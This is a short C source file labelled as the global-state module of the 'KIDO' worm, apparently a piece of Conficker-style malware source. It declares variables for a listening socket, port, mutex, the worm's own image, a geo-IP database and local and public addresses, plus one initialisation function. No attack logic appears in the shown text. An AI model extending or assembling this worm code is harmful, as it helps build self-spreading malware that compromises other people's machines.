/*====================================================================================
 *  KIDO worm - global state.
 *====================================================================================*/
#include "kido_worm.h"

HMODULE  g_hinst = NULL;
char     g_path[MAX_PATH] = {0};
DWORD    g_counter = 0;
HANDLE   g_mutex = NULL;
DWORD    g_port = 0;
SOCKET   g_listen_sock = INVALID_SOCKET;
CRITICAL_SECTION g_cs_port;
int      g_cs_port_init = 0;
uint8_t* g_image = NULL;
size_t   g_image_len = 0;
size_t   g_image_overlay_off = 0;
HANDLE   g_file_lock = NULL;
uint8_t  g_lang = 9;          /* default English */
int      g_geo_db_loaded = 0;
uint8_t* g_geo_db = NULL;
size_t   g_geo_db_len = 0;
char     g_geo_file[260] = {0};
uint8_t  g_ip_local[4]  = {0};
uint8_t  g_ip_public[4] = {0};
char     g_token1[16] = {0};
char     g_token2[16] = {0};
HANDLE   g_evt_instance = NULL;
HANDLE   g_evt_worker   = NULL;
HANDLE   g_evt_thread   = NULL;

void kido_cs_init(void)
{
    if (!g_cs_port_init){
        InitializeCriticalSection(&g_cs_port);
        g_cs_port_init = 1;
    }
}
